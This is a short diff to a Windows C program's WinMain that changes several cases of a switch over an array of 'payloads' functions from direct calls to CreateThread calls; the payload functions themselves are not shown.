@@ -276,7 +276,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
                 payloads[7]();
                 break;
             case 8:
-                payloads[8]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[8], NULL, NULL, NULL);
                 break;
             case 9:
                 payloads[9]();
@@ -312,13 +312,13 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
                 payloads[19]();
                 break;
             case 20:
-                payloads[20]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[20], NULL, 0, NULL);
                 break;
             case 21:
-                payloads[21]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[21], NULL, 0, NULL);
                 break;
             case 22:
-                payloads[22]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[22], NULL, 0, NULL);
                 break;
             case 23:
                 payloads[23]();
@@ -330,10 +330,10 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
                 payloads[25]();
                 break;
             case 26:
-                payloads[26]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[26], NULL, 0, NULL);
                 break;
             case 27:
-                payloads[27]();
+                CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[27], NULL, 0, NULL);
                 break;
             case 28:
                 payloads[28]();
